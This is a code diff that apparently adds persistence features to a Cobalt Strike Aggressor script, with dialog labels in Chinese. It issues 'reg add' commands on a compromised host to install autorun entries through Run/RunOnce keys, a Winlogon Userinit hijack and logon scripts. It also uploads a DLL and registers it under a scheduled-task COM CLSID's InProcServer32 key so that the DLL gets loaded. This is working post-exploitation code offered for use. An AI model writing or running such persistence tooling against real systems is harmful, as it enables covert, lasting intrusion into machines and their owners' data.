@@ -96,8 +96,69 @@ sub dialog_tokendown{
     dbutton_action($dialog, "Run");
     dialog_show($dialog);
 }
+sub InstallAutoRun{
+    local('$Prefix $File $Key $Item $Reg');
+    $Prefix = "\\Software\\Microsoft\\Windows\\CurrentVersion\\";
+    $File = replace($3['CallBackFile'], "\"", "");
+    $Key = "\"".$3['RegKey'];
+    $Item = $3['RegItem']."\"";
+    if($3['RegItem'] eq "Winlogon"){
+        $Prefix = replace($Prefix,'Windows',"Windows NT");
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /v Userinit /t REG_SZ /d \" C:\\Windows\\system32\\userinit.exe, $+ $File \" /f ");
+    }
+    else if($3['RegItem'] eq "Logon Scripts"){
+        bshell($bid,"reg add  \"HKCU\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \" $+ $File \" /f ");
+    }
+    else{
+        $Reg = $Key.$Prefix.$Item;
+        bshell($bid,"reg add  $+ $Reg /f");
+        bshell($bid,"reg add  $+ $Reg /v Svchost /t REG_SZ /d \" $+ $File \" /f ");
+    }
+}
+sub CacheTaskExec{
+    btask($3['bid'], "CacheTask任务计划COM接口DLL劫持");
+    $dllname = split("\\\\", $3['dllpath'])[-1];
+    bupload!($3['bid'], $3['dllpath']);
+    bmv!($3['bid'], $dllname, $3['uploadpath']);
+    bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /ve /t REG_SZ /d $3['uploadpath']");
+    bshell!($3['bid'], "reg add \"HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32\" /v ThreadingModel /t REG_SZ /d Both")
+}
+
+sub CacheTask{
+    foreach $id ($bid){
+        $dialog = dialog("CacheTask", %(uploadpath => "C:\\Windows\\Temp\\test.dll", bid => $id), &CacheTaskExec);
+        dialog_description($dialog, "CacheTask任务计划COM接口DLL劫持,适用系统:Windows 10/Windows Server 2012或以上");
+        drow_text($dialog, "uploadpath", "uploadpath:");
+        drow_file($dialog, "dllpath", "dllpath:");
+        dbutton_action($dialog, "run");
+        dialog_show($dialog);
+    }
+}
+
+
+
+
 
 menu "权限维持"{
+    item "注册表自启"{
+        if (!-isadmin $1['@']){
+            show_error("当前 Session 非管理员权限！!");
+        }
+        else{
+            $bid = $1['@'];
+            $Dialog = dialog("Auto Run",%(RegKey => "HKLM", RegItem => "Run", CallBackFile => "C:\\Windows\\system32\\cmd.exe /c start",bid => $bid),&InstallAutoRun);
+            dialog_description($Dialog, "注册表添加启动启动项，如果选择RunOnce，您将以管理员权限返回。");
+            drow_combobox($Dialog, "RegKey", "Key: ", @("HKLM", "HKCU"));
+            drow_combobox($Dialog, "RegItem", "RegItem: ", @("Run", "RunOnce", "RunOnceEx", "Winlogon", "Logon Scripts"));
+            drow_text($Dialog, "CallBackFile", "CallBackFile: ");
+            dbutton_action($Dialog, "Reg");
+            dialog_show($Dialog);
+        }
+    }
+    item "CacheTask 任务计划 COM 接口劫持"{
+        CacheTask($bid);
+    }
     item "&cs服务马"{
             $bid = $1;
             dialog_service($bid);
